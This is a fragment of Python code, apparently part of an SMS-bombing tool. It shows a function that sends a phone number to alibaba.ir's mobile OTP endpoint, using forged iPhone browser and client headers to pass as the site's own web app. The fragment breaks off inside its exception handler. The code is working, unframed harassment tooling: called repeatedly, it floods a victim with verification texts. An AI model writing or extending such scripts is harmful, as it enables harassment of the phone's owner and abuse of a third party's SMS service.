...
def send_alibaba_request(phone):
    url = "https://ws.alibaba.ir/api/v3/account/mobile/otp"
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "x-client-type": "WEB-NEW,PRODUCTION,CSR,www.alibaba.ir,mobile,Mobile Safari,16.6,iPhone,Apple,iOS,16.7.10,3.202.2",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_10 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
    }
    payload = {"phoneNumber": phone}
    try:
        response = requests.post(url, json=payload, headers=headers)
        print(f"Alibaba Response: {response.status_code} - {response.text}")
    except Exception as e:
